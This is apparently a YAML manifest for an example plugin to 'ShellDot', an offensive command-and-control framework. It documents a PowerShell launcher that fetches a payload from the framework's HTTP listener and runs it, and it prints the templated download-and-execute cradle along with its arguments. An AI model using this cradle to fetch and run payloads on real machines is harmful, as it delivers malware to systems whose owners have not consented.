name: Example PowerShell Launcher Plugin by ShellDot
version: 0.7.0
description: |
  Example Powershell All Plugin for ShellDot. This plugin provides a single launcher that uses HTTP listeners' payload hosting feature
  to download and execute a file in PowerShell. This launcher is compatible with all types of payloads except for SHELLCODE.

  The launcher template itself is very simple located in main.template.ps1
  %%isHTTPS%% (New-Object System.Net.WebClient).DownloadFile('%%url%%', '%%filename%%');%%execution%%

  The launcher template uses four arguments:
  - isHTTPS: A boolean value that determines whether the download should be done over HTTPS or HTTP. This depends on the HTTP listener configuration.
  - url: The URL of the file to download. It is provided by the HTTP listener.
  - filename: The name of the file to save the downloaded file as. Default by the GUI would be payload.exe, but it is overriden by args/arg.filename.js.
  - execution: The command to execute the downloaded file. This depends on the payload type, and is defined in args/arg.execution.js.

  Arguments are parsed in the order they are defined. Previously parsed arguments will become available to later arguments
   via argumentsPluginInterface["args.name"]

  A single plugin can define multiple launchers. This plugin defines a single launcher that is compatible with all types of payloads except for SHELLCODE.

  NB! Comments inside launcher.path template are not cleaned on generation. They will be in final output.
